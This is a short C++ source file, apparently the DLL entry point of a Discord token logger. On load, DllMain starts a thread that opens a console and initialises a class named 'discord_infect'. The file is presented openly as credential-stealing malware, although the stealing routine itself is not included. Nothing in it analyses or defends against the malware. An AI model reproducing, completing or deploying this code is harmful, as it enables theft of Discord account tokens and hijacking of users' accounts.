#include "dllmain.h"
#include <sapi.h>
#include <Shlobj.h>
#include <iostream>
#include <algorithm>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>

void init_token_logger() 
{
    AllocConsole(); // open a console
    freopen(_("CONOUT$"), _("w"), stdout); 

    discord_infect discord_manager;
    discord_manager.init();
}

BOOL APIENTRY DllMain(HMODULE module, DWORD reason_for_call, LPVOID lp_reserved)
{
    if (reason_for_call == DLL_PROCESS_ATTACH) {
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)init_token_logger, 0, 0, 0);
    }
    return 1;
}

